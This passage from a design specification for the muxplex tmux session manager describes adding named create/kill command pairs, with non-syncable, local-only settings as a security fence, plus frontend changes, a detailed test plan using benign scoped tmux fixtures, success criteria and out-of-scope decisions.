  unreachable, peer pre-feature, ids drifting between hosts) are real design work with zero
  demand. Adding it later is purely additive. Record this as a decision in API_SEMANTICS.md so it
  reads as a choice, not an omission.

`federation_delete_session` (main.py:3131-3173): **no change.** The remote resolves the pair from
its own manifest. `?force` is not proxied (no consumer; additive later).

### 7.5 Complete additive-change summary

| Endpoint | Change | Existing client sending nothing |
|---|---|---|
| `GET /api/session-commands` | NEW | unaffected |
| `POST /api/sessions` | optional body `command_id`; response `+command_id` | identical behavior, one extra response field |
| `DELETE /api/sessions/{name}` | optional query `force`; response `+command_id` (`+forced` on force path) | identical behavior, one extra response field |
| `POST /api/federation/{id}/sessions` | forwards `command_id` when present | identical proxied request |
| `GET /api/settings` | `session_commands` now present (a new `DEFAULT_SETTINGS` key) | additive field |
| `PATCH /api/settings` | `session_commands` silently ignored + warned (existing `LOCAL_ONLY_KEYS` loop) | n/a |
| `GET`/`PUT /api/settings/sync` | **no change** — key absent from `SYNCABLE_KEYS` | n/a |
| `DELETE /api/sessions/current` | **no change** | n/a |

---

## 8. `sessions.py` and `restore.py`

### 8.1 `spawn_session_command()` — sessions.py:420

```python
async def spawn_session_command(
    name: str, command_id: str | None = None
) -> tuple[bool, str | None]:
```

- `command_id=None` → the reserved `default` pair → `settings["new_session_template"]`. **Byte-identical
  to today** for every existing caller.
- Resolve via `find_session_command(command_id, settings)` on the settings dict already loaded at
  :456.
- `None` → return `(False, f"Unknown command_id {command_id!r}: no such configured session
  command.")` **without spawning anything.**

  This is defense-in-depth, not the primary gate: `create_session()` validates first so it can
  return a 400 with the `available` list (§6.3). But this function is *also* called from
  `restore.py`, which has no HTTP boundary, and its docstring already states it is the single
  source of truth for "how to create a session". A `(False, msg)` return is the shape both callers
  already handle.
- Everything downstream — the `shutil.which()` pre-flight (:459-470), `shlex.quote()` (:472), the
  `should_escape()` / `wrap_shell_argv()` cgroup branch (:482-495), the 30s timeout tolerance
  (:524-532), `ensure_history_retention()` (:540), and **the non-zero-exit-but-session-exists TTY
  recovery (:499-511)** — is **unchanged**. It operates on `template` and `name`; only where
  `template` comes from changes.

  The TTY-attach recovery is explicitly load-bearing for this feature: the exemplar non-default
  pair (`amplifier-workspace`) is the very command whose behavior that branch exists for. A test
  asserts it still fires on a non-default pair (§13.2).

Docstring: amend the "`new_session_template` is an arbitrary user shell command" paragraph
(:434-440) to "the resolved pair's `new_session_template`", and add a sentence stating that
`command_id=None` selects the reserved `default` pair so pre-existing callers are unchanged.

### 8.2 `restore.execute_restore()` — restore.py:188-246

```python
async def execute_restore(names: list[str]) -> RestoreReport:
```

Signature unchanged. Inside the loop (`for name in names:`), before line 209:

```python
        recorded = get_created_with(load_manifest(), name)
        if recorded is not None and find_session_command(recorded) is None:
            report.results.append(SessionResult(
                name=name, status="fail",
                detail=f"recorded command {recorded!r} is no longer configured; "
                       "restore it in ~/.config/muxplex/settings.json and re-run",
            ))
            continue
        ok, error = await spawn_session_command(name, command_id=recorded)
```

- `recorded is None` → `spawn_session_command(name, None)` → default pair → identical to today.
- Everything else in the function — sequential execution, the live re-verification at :219-224,
  `_probe_windows()`, the `windows <= 1` warn, `_persist_restored(restored)` — **unchanged**.
- Load the manifest **inside** the loop, not once before it: restore is explicitly designed to run
  while the poll loop is live (restore.py module docstring, :25-36), and a per-iteration read is
  consistent with `_persist_restored()`'s read-right-before-write discipline. N sequential reads of
  a small JSON file is not a cost worth optimizing here.

**Why this is required, not a nice-to-have:** without it, `muxplex restore` after a host reboot
recreates every `amplifier-workspace` session as a bare `tmux new-session`. AGENTS.md's own
recovery section calls that outcome out by name — *"A bare tmux session is one window with the
wrong cwd; it looks restored and isn't."* This feature would silently reintroduce it.

**Note the existing warn already covers the near-miss:** `windows <= 1` (restore.py:228-237)
produces a WARN for a session that came back as a single bare window. With this change, a
wrong-pair restore can no longer *reach* that check silently — the mismatch is a FAIL upstream.

### 8.3 `cli.py`

**No changes.** `cmd_restore` (:1369) drives `restore.execute_restore()` and prints
`SessionResult`s; the new FAIL flows through the existing reporting and the existing non-zero exit
(:1409-1411).

**No new CLI subcommand.** `muxplex config set session_commands ...` is fenced by
`LOCAL_ONLY_KEYS` and silently no-ops (§0.4) — a pre-existing wart. Do not add a
`muxplex commands` subcommand: there is no create/delete CLI to select a pair *for*, so it would
be a settings editor for one key, which is what `$EDITOR` is.

**Optional, 1 line, do it if trivial:** amend `cmd_restore`'s docstring (:1392-1395) from
"replaying the same `new_session_template` the running server would use" to "replaying the command
pair each session was created with (falling back to the default pair for sessions muxplex did not
create)". A stale docstring here is exactly the context-poisoning AGENTS.md warns about.

---

## 9. Federation implications

**`session_commands` is NOT syncable. This is the same call as `new_session_template`, for the
same reason, and it is not close.**

The `SYNCABLE_KEYS` reasoning (settings.py:161-162, AGENTS.md's "Terminal input" section,
API_SEMANTICS.md's `LOCAL_ONLY_KEYS` bullet): *federation sync must never widen a local-only
fence.* A syncable `session_commands` would let a peer define a pair on this host — the v0.31.4
RCE with an extra hop. Non-negotiable.

Enforcement is structural and already exists; there is no new code:
- `get_syncable_settings()` (settings.py:610) projects onto `SYNCABLE_KEYS`. Absent key → never
  sent.
- `apply_synced_settings()` (settings.py:558) iterates `SYNCABLE_KEYS`. Absent key → never
  written.

Regression guard (§13.1): extend the existing `test_syncable_keys_excludes_infrastructure`
(test_settings.py:1080) and the `/api/settings/sync` `infra_keys` tuple (test_api.py:5247) with
`"session_commands"`. Both are lists that must be kept in step — that is why they are named here
rather than left for the builder to find.

The manifest (`created_with`) is device-local by construction and never synced — same as
`pruning.json` (manifest.py:74-76). Nothing to do.

**Consequence for a federated fleet, state it in README:** command pairs are per-host
configuration. Two hosts that should offer the same pairs need the same entries in each host's
`settings.json`. That is the correct trade for a key that names a shell command, and it matches
`tmux_socket_dir` / `tmux_theme`, which are non-syncable for adjacent reasons.

---

## 10. Frontend

Reference the AGENTS.md constraint before touching anything: **every top-level binding across
`app.js` + `terminal.js` must be unique** (the v0.31.3 `_ownDeviceId` collision). New bindings
below are prefixed accordingly. `tests/test_shared_scope.mjs` covers this automatically.

### 10.1 State and fetch

New top-level bindings in `app.js` (names chosen to be collision-free with `terminal.js`):

```js
let _sessionCommands = null;      // resolved list from GET /api/session-commands, or null
let _sessionCommandErrors = [];   // strings from that response's `errors`
```

Fetch once at load, alongside the existing `loadServerSettings()` call. On failure: leave
`_sessionCommands = null`, log to console, **do not toast**. A null list degrades to §10.2's
one-pair path — which is today's UI — so a failed fetch costs the picker, never the ability to
create a session.

Do **not** poll this. Pairs change only when the operator edits `settings.json`, and there is
already a settings-change signal (`settings_updated_at` on `/api/state`) if a future need arises.
Adding a second poll for a rarely-changing local file is the kind of speculative machinery this
codebase pushes back on.

### 10.2 The picker — mirror `_createDeviceSelect()` exactly

```js
/**
 * Create an optional command-pair <select> for session creation.
 * Returns null when fewer than two pairs are configured (or the list has not
 * loaded) -- at one pair the create control is byte-identical to pre-feature
 * muxplex, which is the point. Deliberately the same shape and same
 * null-means-omit contract as _createDeviceSelect() above, so both callers
 * (showNewSessionInput, showFabSessionInput) handle them identically.
 * @returns {HTMLSelectElement|null}
 */
function _createCommandSelect() { ... }
```

Placement: immediately after `_createDeviceSelect()` (app.js:4526-4555).

- Return `null` when `!_sessionCommands || _sessionCommands.length < 2`.
- One `<option>` per entry: `value = cmd.id`, `textContent = cmd.label`,
  `title = cmd.new_session_template` (this is what resolves the "Default" label ambiguity of §4).
- `class = 'new-session-command-select'` (new CSS class; style it to match
  `.new-session-device-select` — reuse the existing rule via a grouped selector rather than
  duplicating declarations).
- First option (`default`) selected by default. No persistence of the last choice — nobody asked
  for it, and a sticky selection that silently changes what "create" does is a footgun.

### 10.3 Wiring into both create flows

`showNewSessionInput()` (app.js:4566) and `showFabSessionInput()` (app.js:4620) both:

- call `const cmdSelect = _createCommandSelect();`
- insert it beside the device select when non-null (same `insertBefore` / `appendChild` position
  pattern, ordered: device select, command select, name input)
- extend the existing blur-cleanup guards to include `cmdSelect` (the current guards check
  `document.activeElement === select` and `=== input`; a third focusable control needs the same
  treatment or the panel closes when the user opens the picker — **this is the single easiest bug
  to introduce here**)
- extend the `Escape`-keydown handler to `cmdSelect`
- on Enter: `createNewSession(name, remoteId, cmdSelect ? cmdSelect.value : '')`

`createNewSession(name, remoteId, commandId)` (app.js:4685) — third parameter, defaulting to
falsy:

```js
    var body = { name: name };
    // Omit entirely when unset -- a pre-feature-shaped body is what keeps an
    // un-picked create byte-identical to before. Also omit for a REMOTE
    // create: command ids are namespaced to the host that defines them, so
    // OUR id is meaningless (and likely a 400) on the peer. The remote uses
    // its own default -- identical to today. See spec §7.4.
    if (commandId && !deviceId) body.command_id = commandId;
    const res = await api('POST', endpoint, body);
```

Everything else in `createNewSession` — the auto-add-to-view `patchSettingsGuarded()` block, the
toast, the loading placeholder tile, the 30s appearance poll, the `auto_open_created` behavior —
**unchanged**.

**Consequence of the remote rule:** `_createCommandSelect()` should be disabled (not hidden — no
layout shift) when the device select's value is non-empty. Bind a `change` listener on the device
select that sets `cmdSelect.disabled`. If that proves fiddly, the fallback is acceptable and
specified: leave it enabled and rely on the `!deviceId` guard above, since the value is dropped
anyway — but the disabled state is the honest UI and is preferred.

### 10.4 Settings → Commands tab

**Do not restructure the two existing textareas.** `test_frontend_js.py` contains 229 regex
assertions against `app.js` source text (AGENTS.md's "tripwire for any frontend refactor"), and
`test_frontend_html.py:1071` asserts on this exact markup. Keep `#setting-template` and
`#setting-delete-template` and their `openSettings()` population (app.js:4237, :4243) exactly as
they are — they display the `default` pair, which is what they have always displayed.

**Add below them**, inside `<div class="settings-panel hidden" data-tab="new-session">`
(index.html:274-285):

```html
          <div class="settings-field settings-field--column" id="settings-command-pairs-field" style="display:none">
            <label class="settings-label">Additional command pairs</label>
            <div id="settings-command-pairs" class="settings-command-pairs"></div>
            <span class="settings-helper">Each pair is a create command and its matching kill command; the pair a session was created with is the one used to delete it. For security, these run shell commands on the server, so they can only be changed by editing <code>~/.config/muxplex/settings.json</code> directly (not from the browser).</span>
          </div>
          <div class="settings-field settings-field--column" id="settings-command-errors-field" style="display:none">
            <label class="settings-label">Command pair configuration errors</label>
            <ul id="settings-command-errors" class="settings-command-errors"></ul>
            <span class="settings-helper">These entries in <code>~/.config/muxplex/settings.json</code> were rejected and are not available. Sessions created with them cannot be deleted until they are fixed.</span>
          </div>
```

The helper copy reuses the exact security sentence already at index.html:278/283 (*"For security,
this runs a shell command on the server, so it can only be changed by editing
`~/.config/muxplex/settings.json` directly (not from the browser)."*) — matching the precedent
verbatim, as the brief requires. It names the **file**, never `muxplex config set` (§0.4).

Rendering in `openSettings()`:
- For each entry in `_sessionCommands` **excluding `default`**: a read-only row showing `label`,
  `id`, and both templates. Use `readonly` textareas or plain `<code>` blocks — either is fine;
  what is not fine is any editable control or any `patchServerSetting('session_commands', ...)`
  call. Bind **no** input handlers, exactly as app.js:5039-5043 and :5131-5135 document for the
  singular fields.
- Show `#settings-command-pairs-field` only when there is ≥1 non-default entry.
- Show `#settings-command-errors-field` only when `_sessionCommandErrors.length > 0`, one `<li>`
  per error, `textContent` (never `innerHTML` — these strings contain operator-supplied values).

### 10.5 Files touched

`frontend/app.js`, `frontend/index.html`, `frontend/style.css`.

CSS: add `.new-session-command-select` to the **existing** `.new-session-device-select` rule
(style.css:1552) as a grouped selector, and likewise to the FAB override
`.fab-input-overlay .new-session-device-select` (style.css:1565) — that second rule is easy to
miss and its absence shows up only in the mobile FAB overlay. Plus two small rules for
`.settings-command-pairs` / `.settings-command-errors`. Do not duplicate declarations.

---

## 11. Files changed — complete list

| File | Change |
|---|---|
| `muxplex/settings.py` | `import re`; `"session_commands": []` in `DEFAULT_SETTINGS` (after :47) with the comment block from §3.1; `"session_commands"` in `LOCAL_ONLY_KEYS` (:163-173) + amend its comment block; `RESERVED_COMMAND_ID` / `COMMAND_ID_RE` / `COMMAND_LABEL_MAX_LEN`; `resolve_session_commands()`; `find_session_command()`. **`SYNCABLE_KEYS` untouched.** |
| `muxplex/manifest.py` | `MANIFEST_SCHEMA_VERSION = 2`; `created_with` in `_empty_manifest()`; `load_manifest()` normalization (§5.3); `update_manifest()` reap rules 1 & 2 (§5.4); `get_created_with()` / `set_created_with()` (§5.6) |
| `muxplex/sessions.py` | `spawn_session_command(name, command_id=None)` (§8.1); template lookup at :456-457; docstring amendment |
| `muxplex/restore.py` | import `get_created_with`/`load_manifest`/`find_session_command`; per-name resolution + FAIL branch in `execute_restore()` (§8.2) |
| `muxplex/main.py` | `CreateSessionPayload.command_id` (:810); `GET /api/session-commands` (~:1082); `create_session()` (:1231-1262); `delete_session()` (:1526-1585); `federation_create_session()` body (:3112); startup validation log in `lifespan()` (:635) |
| `muxplex/cli.py` | docstring only (§8.3) — optional |
| `muxplex/frontend/app.js` | §10.1-10.4 |
| `muxplex/frontend/index.html` | §10.4 |
| `muxplex/frontend/style.css` | two class rules (§10.5) |
| `AGENTS.md` | extend the `LOCAL_ONLY_KEYS` paragraph to name `session_commands` |
| `docs/API_SEMANTICS.md` | §12 |
| `docs/AGENT_GUIDE.md` | §12 |
| `README.md` | §12 |
| tests | §13 |

**Not changed, and each is a deliberate decision:** `state.py` (§0.3), `views.py`, `pruning.py`,
`bells.py`, `terminal_input.py`, `ttyd.py`, `auth.py`, `federation_delete_session` (§7.4),
`DELETE /api/sessions/current`, `GET /api/sessions` (§16).

---

## 12. Documentation updates

**`AGENTS.md`** — in the "Terminal input" section's `LOCAL_ONLY_KEYS` paragraph (:96-110), add
`session_commands` to the enumerated list with a one-clause reason: *"`session_commands` (a list
of named create/kill pairs, each holding the same two arbitrary shell commands — the API may list
and select a pair, never define one)"*.

**`docs/API_SEMANTICS.md`** — one new bullet in the "Semantics external clients re-implement"
section:
- `GET /api/session-commands` is the canonical **server-side** resolution of the configured pairs:
  the legacy singular `new_session_template`/`delete_session_template` folded in as the reserved
  `default` entry, invalid entries excluded, `errors` reported. Clients MUST NOT re-derive this
  from `GET /api/settings`'s raw `session_commands` — same rationale as `GET /api/view`.
- `POST /api/sessions`'s optional `command_id` and `DELETE /api/sessions/{name}`'s automatic
  pair-matching, with the explicit statement that **omitting `command_id` is byte-identical to
  today**.
- The `unknown_command_id: true` 409 discriminator, listed alongside `backstop: true` and
  `terminal_conflict: true` as the third member of that convention.
- `session_commands` is in `LOCAL_ONLY_KEYS` and absent from `SYNCABLE_KEYS` — extend the existing
  `LOCAL_ONLY_KEYS` bullet's five-key list to six.
- The v1 federation decision (§7.4): `command_id` is forwarded on create when supplied but the
  namespace is the remote's; `GET /api/federation/{device_id}/session-commands` deliberately not
  added.

**`docs/AGENT_GUIDE.md`** — in "Create" (~:340-358): document the optional `command_id`, the
`GET /api/session-commands` discovery call, and one worked `curl`. In "Delete" (~:376-383): state
that muxplex uses the pair the session was created with, automatically, and document the 409 +
`?force=true` recovery. Keep the vendor-neutral tone.

**`README.md`** — a "Command pairs" subsection under the existing session-template documentation:
the schema, a worked `settings.json` example, the file-edit-only requirement and why, the fact
that pairs are **per-host and not federated** (§9), and the §6.4 rename hazard with its two fixes.
Note `test_readme.py` exists — check whether it asserts on settings-key coverage and keep it green.

---

## 13. Test plan

`make test` (DTU) is the gate. Never `uv run pytest` on the dev box — AGENTS.md's
`pytest_sessionstart` guard will refuse, and that refusal is correct.

Workflow, in order (AGENTS.md "Testing & workflow"): **commit locally → test in the DTU → iterate
there until green → then push.**

### 13.1 `tests/test_settings.py`

| Test | Asserts |
|---|---|
| `test_session_commands_in_default_settings` | key present, defaults to `[]` |
| `test_session_commands_is_local_only` | `"session_commands" in LOCAL_ONLY_KEYS` |
| `test_session_commands_not_syncable` | `"session_commands" not in SYNCABLE_KEYS` |
| `test_session_commands_not_patchable` | `patch_settings({"session_commands": [<pair>]})` leaves the value at `[]`, on disk too; a co-submitted `fontSize` still applies (mirrors `test_delete_session_template_not_patchable`, :356) |
| `test_resolve_empty_config_yields_only_default` | one entry, `id == "default"`, templates == the singular settings values, `errors == []` |
| `test_resolve_default_entry_tracks_custom_singular_template` | set `new_session_template` to `amplifier-workspace {name}`; the `default` entry carries it |
| `test_resolve_orders_default_first` | `commands[0].id == "default"` with 2+ configured entries, in file order after |
| `test_resolve_rejects_*` | one test per rule V1–V6, each asserting: entry absent from `commands`, exactly one matching string in `errors`, and **the `default` entry still present** |
| `test_resolve_rejects_reserved_id` | an entry with `id == "default"` is rejected; the legacy default entry survives intact (V3) |
| `test_resolve_rejects_all_duplicates` | three entries, two sharing an id → **both** copies absent, third present, one error naming both indexes (V7) |
| `test_resolve_non_list_session_commands` | `"session_commands": {"a": 1}` → only `default`, one error, no crash |
| `test_resolve_logs_errors_at_error_level` | `caplog` at ERROR on `muxplex.settings` |
| `test_find_none_returns_default` | `find_session_command(None)` → the `default` entry |
| `test_find_unknown_returns_none` | unknown id, and an id belonging to a *rejected* entry, both → `None` (never the default) |
| extend `test_syncable_keys_excludes_infrastructure` (:1080) | add `"session_commands"` to `infra_keys` |

`tests/test_input.py:618` — `test_local_only_keys_are_exactly_the_input_fences` asserts the
**exact** frozenset. It **will fail** until `"session_commands"` is added to its literal. Update
it and extend its docstring with the one-line reason; do not loosen the equality assertion to a
subset check — the exactness is the protection.

### 13.2 `tests/test_sessions.py`

| Test | Asserts |
|---|---|
| `test_spawn_default_when_command_id_none` | the shell command equals `new_session_template` with the name substituted — **the byte-identity guard for every existing caller** |
| `test_spawn_uses_named_pair` | `command_id="amplifier"` → the pair's `new_session_template` is what reaches the subprocess |
| `test_spawn_unknown_command_id_returns_error_without_spawning` | `(False, msg)` and the subprocess mock was **never called** |
| `test_spawn_named_pair_still_honors_tty_attach_recovery` | non-zero exit + session present in `enumerate_sessions()` → `(True, None)`. **Extends the existing `test_spawn_session_command_escaped_still_honors_tty_attach_recovery` (:687) to the non-default pair — the branch this feature is most likely to silently break, since `amplifier-workspace` is the exemplar non-default pair AND the reason that branch exists.** |
| `test_spawn_named_pair_still_shlex_quotes_name` | mirrors the existing quoting assertions (see `test_restore_integration.py:140`) for a non-default template |
| `test_spawn_named_pair_respects_cgroup_escape` | `should_escape()` True → `wrap_shell_argv` receives the *named pair's* command (guards the 44-session-incident machinery) |

### 13.3 `tests/test_manifest.py`

| Test | Asserts |
|---|---|
| `test_load_v1_manifest_yields_empty_created_with` | a v1 file on disk loads with `created_with == {}` and `schema == 2` |
| `test_set_created_with_is_pure` | input dict unmutated (matches `mark_restored`'s contract) |
| `test_get_created_with_absent_returns_none` | |
| `test_same_epoch_tombstone_reaps_created_with` | session recorded, then absent from `live_names` at the same epoch → both `sessions[name]` and `created_with[name]` gone |
| `test_created_with_survives_before_first_observation` | **the §0.3 regression guard.** Record written for a name never yet in `live_names`; run `update_manifest` with the same epoch; the record **survives**. |
| `test_tmux_unavailable_never_reaps_created_with` | `epoch_now=None` → manifest returned completely unchanged |
| `test_cold_start_retains_live_and_pending_created_with` | live names and `pending_restore` names retained; a third, unrelated name dropped |
| `test_created_with_pop_does_not_add_spurious_change` | a cycle whose only difference is a `created_with` pop that accompanies an already-counted `sessions` deletion does not report `changed` twice / does not make a quiet cycle dirty (protects the "< 1 write/minute" target) |

### 13.4 `tests/test_api.py`

| Test | Asserts |
|---|---|
| `test_get_session_commands_default_only` | `commands` length 1, `id == "default"`, `default_id == "default"`, `errors == []` |
| `test_get_session_commands_lists_configured` | order, ids, labels, both templates present |
| `test_get_session_commands_reports_errors` | a malformed entry → absent from `commands`, present in `errors` |
| `test_get_session_commands_requires_auth` | not in `_AUTH_EXEMPT_PATHS` |
| `test_create_without_command_id_unchanged` | **byte-identity**: response `name`/`ok` unchanged; the spawned command is `new_session_template` |
| `test_create_response_includes_command_id` | `"command_id": "default"` present |
| `test_create_with_command_id_uses_that_pair` | |
| `test_create_unknown_command_id_400_nothing_spawned` | 400, `unknown_command_id: true`, `available` list, spawn mock **never called** |
| `test_create_records_command_id_in_manifest` | `created_with[name]` after a successful create |
| `test_create_failure_records_nothing` | spawn returns `(False, ...)` → 500 → `created_with` unchanged |
| `test_delete_no_record_uses_default` | **byte-identity**: the subprocess command equals today's exactly. Extends `test_api.py:3417`. |
| `test_delete_uses_recorded_pair` | record `amplifier` → `delete_session_template` of that pair is what runs |
| `test_delete_unknown_recorded_id_409_nothing_run` | 409, `unknown_command_id: true`, `command_id`, `available`; `subprocess.run` **never called** |
| `test_delete_force_uses_default_and_flags` | `?force=true` → 200, `forced: true`, `command_id: "default"`, warning logged naming the missing id |
| `test_delete_response_includes_command_id` | |
| `test_delete_still_returns_200_on_command_failure` | existing contract preserved (main.py:1532-1533) |
| `test_federation_create_forwards_command_id` | body is `{"name": ...}` when absent; `{"name": ..., "command_id": ...}` when present |
| extend `/api/settings/sync` infra-key test (:5247) | add `"session_commands"` |

### 13.5 `tests/test_restore_integration.py` / `test_manifest.py`

| Test | Asserts |
|---|---|
| `test_restore_uses_recorded_pair` | recorded id → `spawn_session_command` called with it |
| `test_restore_no_record_uses_default` | byte-identity with today |
| `test_restore_unresolvable_recorded_id_fails_loudly` | `status == "fail"`, detail names the id, **nothing spawned**, name stays in `pending_restore` |

### 13.6 `tests/test_client_contract.py`

Add assertions that the no-`command_id` create/delete responses still carry every field
`muxplex-client` parses. This is the mechanism (per that file's docstring) that turns a wire-shape
regression red in the same PR.

### 13.7 Frontend — `frontend/tests/*.mjs`

Run with the **glob**: `node --test frontend/tests/*.mjs`. AGENTS.md documents that the
single-file command silently skipped a whole suite.

| Test | Asserts |
|---|---|
| `test_command_select_null_below_two_pairs` | `_createCommandSelect()` returns `null` at 0 and 1 pairs (**the "UI unchanged at one pair" invariant**) |
| `test_command_select_options_at_two_plus` | option count, values, labels, `title` = create template, `default` pre-selected |
| `test_create_omits_command_id_when_unset` | POST body is exactly `{name}` |
| `test_create_omits_command_id_for_remote` | device selected → no `command_id` in body even when a pair is picked (§7.4) |
| `test_create_sends_command_id_when_picked_local` | |
| `test_command_select_focus_does_not_close_input` | blur-guard regression (§10.3 — the easiest bug to introduce) |
| `test_settings_renders_pairs_readonly` | rows rendered; **no** `patchServerSetting('session_commands'` anywhere in source (mirrors `test_app.mjs:3513-3519`) |
| `test_settings_renders_errors` | errors rendered as `textContent`, field hidden when empty |

`tests/test_shared_scope.mjs` covers the new top-level bindings automatically. Verify it passes —
that is the v0.31.3 collision guard.

`tests/test_frontend_html.py:1071` asserts the templates are read-only; extend to the new markup.
If any `test_frontend_js.py` source assertion breaks, apply AGENTS.md's rule: **ask whether the
behavior changed first**; if it did not, fix the assertion to follow the new structure (assert the
delegation *and* the delegate), never loosen it to pass.

### 13.8 End-to-end proof with real tmux — the one that actually proves pair-matching

Unit tests with mocked subprocesses prove the *wiring*. They cannot prove that pair B's teardown
ran and pair A's did not, against a real tmux server. This test does.

Mark `@pytest.mark.integration` (needs a real tmux binary), place in
`tests/test_restore_integration.py` or a new `tests/test_command_pairs_integration.py`.

**Safety rails — mandatory, per AGENTS.md's "NEVER broad-kill by process name":**
- Use an explicit named scratch socket: `tmux -L muxplex-pairs-test-<uuid4hex> ...`
- Clean up with `tmux -L <that exact socket> kill-server` — **never** a bare `tmux kill-server`
- **Never** `pkill -f tmux` / `pkill -f muxplex` / `killall`
- All markers under `tmp_path`
- Use in-process `TestClient(app)` — no separate uvicorn process exists to mis-kill

**Fixture — pairs with distinguishable, observable side effects.** This is the crux: the create
and delete commands must leave evidence of *which pair ran*, not merely that *a* pair ran.

```jsonc
// written to the redirected SETTINGS_PATH (conftest's autouse fixture)
{
  "new_session_template":    "sh -c 'touch <TMP>/created-default-{name}; tmux -L <SOCK> new-session -d -s {name}'",
  "delete_session_template": "sh -c 'touch <TMP>/deleted-default-{name}; tmux -L <SOCK> kill-session -t {name}'",
  "session_commands": [
    {
      "id": "alpha", "label": "Alpha",
      "new_session_template":    "sh -c 'touch <TMP>/created-alpha-{name}; tmux -L <SOCK> new-session -d -s {name}'",
      "delete_session_template": "sh -c 'touch <TMP>/deleted-alpha-{name}; tmux -L <SOCK> kill-session -t {name}'"
    },
    {
      "id": "beta", "label": "Beta",
      "new_session_template":    "sh -c 'touch <TMP>/created-beta-{name}; tmux -L <SOCK> new-session -d -s {name}'",
      "delete_session_template": "sh -c 'touch <TMP>/deleted-beta-{name}; tmux -L <SOCK> kill-session -t {name}'"
    }
  ]
}
```

**Scenario 1 — pair matching across create and delete (the headline proof):**

1. `POST /api/sessions {"name": "e2e-beta", "command_id": "beta"}` → 200,
   `command_id == "beta"`.
2. **Filesystem:** `created-beta-e2e-beta` exists; `created-alpha-*` and `created-default-*` do
   **not**. Proves the right *create* ran.
3. **tmux:** `tmux -L <SOCK> list-sessions` contains `e2e-beta`.
4. **Manifest:** `load_manifest()["created_with"]["e2e-beta"] == "beta"`.
5. Drive one poll cycle (or seed the session cache) so the fail-closed `name in get_session_list()`
   check at main.py:1545-1547 passes — **this step is required**; without it the delete 404s on the
   ~2s read-model lag (API_SEMANTICS.md, "eventually consistent") and the test fails for an
   unrelated reason.
6. `DELETE /api/sessions/e2e-beta` → 200, `command_id == "beta"`.
7. **Filesystem:** `deleted-beta-e2e-beta` exists; `deleted-alpha-*` and `deleted-default-*` do
   **not**. **This is the assertion that proves pair matching end to end** — a wrong-pair
   implementation passes every other check in this list and fails exactly here.
8. **tmux:** `list-sessions` no longer contains `e2e-beta`.

**Scenario 2 — the default pair is untouched (byte-identity, live):**

`POST /api/sessions {"name": "e2e-plain"}` with **no** `command_id`, then delete. Assert
`created-default-e2e-plain` / `deleted-default-e2e-plain` exist and no alpha/beta marker does.
This is the live-tmux form of the additive-only guarantee.

**Scenario 3 — a session muxplex did not create (§6.2):**

Create `e2e-outside` directly with `tmux -L <SOCK> new-session -d -s e2e-outside` (no manifest
record). Refresh the session cache. `DELETE /api/sessions/e2e-outside` → 200,
`command_id == "default"`, `deleted-default-e2e-outside` exists, session gone from tmux.

**Scenario 4 — the recorded pair disappears (§6.1), both branches:**

Create `e2e-orphan` with `command_id="alpha"`. Rewrite `settings.json` removing the `alpha` entry.
Refresh caches.
- `DELETE /api/sessions/e2e-orphan` → **409**, `unknown_command_id: true`, `command_id == "alpha"`.
  **The session is still alive in `tmux -L <SOCK> list-sessions`, and no `deleted-*` marker of any
  kind exists** — proving the refusal happened before any command ran.
- `DELETE /api/sessions/e2e-orphan?force=true` → 200, `forced: true`,
  `deleted-default-e2e-orphan` exists, session gone.

**Teardown:** `tmux -L <SOCK> kill-server` (socket-scoped), ignoring "no server running".

**Final step, per AGENTS.md:** after any scratch/integration run, verify the live server is still
up (`GET :8088/api/instance-info` → 200) as the last action.

---

## 14. Success criteria

A builder is done when **all** of these hold, with evidence:

1. `make test` (DTU) is green, including the `@pytest.mark.integration` E2E of §13.8.
2. `node --test frontend/tests/*.mjs` is green, including `test_shared_scope.mjs`.
3. **Byte-identity, proven live, not asserted:** in the DTU, with an empty `session_commands`,
   `POST /api/sessions {"name":"x"}` and `DELETE /api/sessions/x` run exactly the commands
   pre-feature muxplex ran (§13.8 scenario 2 is the evidence).
4. **Pair matching, proven live:** §13.8 scenario 1 step 7 passes — `deleted-beta-*` exists,
   `deleted-alpha-*` and `deleted-default-*` do not.
5. **Fence held, proven:** `PATCH /api/settings {"session_commands":[<pair>], "fontSize":18}` →
   `session_commands` unchanged on disk, `fontSize` applied, one `logger.warning` emitted.
6. **Not syncable, proven:** `GET /api/settings/sync` response contains no `session_commands` key.
7. **No silent substitution, proven:** §13.8 scenario 4's 409 branch leaves the session alive and
   zero `deleted-*` markers on disk.
8. **UI unchanged at one pair:** with one pair configured, `_createCommandSelect()` returns `null`
   and the create control's DOM is identical to `main`.
9. **Restore honors the pair:** §13.5 tests green; `cmd_restore` exits 1 when a recorded pair is
   missing.
10. `AGENTS.md`, `docs/API_SEMANTICS.md`, `docs/AGENT_GUIDE.md`, `README.md` updated per §12.
11. **No version bump, no `CHANGELOG.md` edit** — AGENTS.md: those happen at release time, by the
    owner.

---

## 15. Implementation order

Each step is independently committable and leaves the tree green — so a bad DTU run costs one
step, not the feature.

1. **settings.py** — key, fence, constants, `resolve_session_commands()`, `find_session_command()`
   + §13.1 tests (including the `test_input.py:618` frozenset update). No behavior change yet.
2. **manifest.py** — `created_with`, schema 2, reap rules, accessors + §13.3 tests. Still no
   behavior change.
3. **sessions.py** — `spawn_session_command(command_id=...)` + §13.2 tests. Default path proven
   identical.
4. **main.py** — `GET /api/session-commands`, create, delete, federation body + §13.4 tests.
5. **restore.py** — pair-aware restore + §13.5 tests. (Optional cli.py docstring.)
6. **E2E** — §13.8 with real tmux. **Do not skip; steps 1-5 cannot prove pair matching.**
7. **Frontend** — app.js / index.html / style.css + §13.7 tests.
8. **Docs** — §12.

---

## 16. Explicitly out of scope

Each of these was considered and rejected. Listing them is the point: a later contributor should
read a decision, not an omission.

| Not doing | Why |
|---|---|
| Editing pairs from the UI/API | §2. This is the whole security posture. |
| Fixing `muxplex config set`'s false-success on fenced keys (§0.4) | Pre-existing, adjacent, not caused here. **File a separate issue** — this feature makes it more likely to be hit. |
| A `muxplex commands` CLI subcommand | There is no CLI create/delete to select a pair *for* (§0.1). It would be a settings editor for one key — that is `$EDITOR`. |
| `command_id` on `DELETE` | §7.3. Defeats design point 3 and adds a capability with no use case. |
| Per-session `command_id` in `GET /api/sessions` / `GET /api/view` | No consumer. Purely additive later. |
| `default_command_label` setting | §4. Nobody has asked; the settings tab and the option `title` resolve the ambiguity. |
| `GET /api/federation/{device_id}/session-commands` + cross-device picker | §7.4. Real design work (unreachable peers, pre-feature peers, id drift) for zero demand. |
| Syncing pairs across the federation | §9. Non-negotiable — it is the v0.31.4 RCE with an extra hop. |
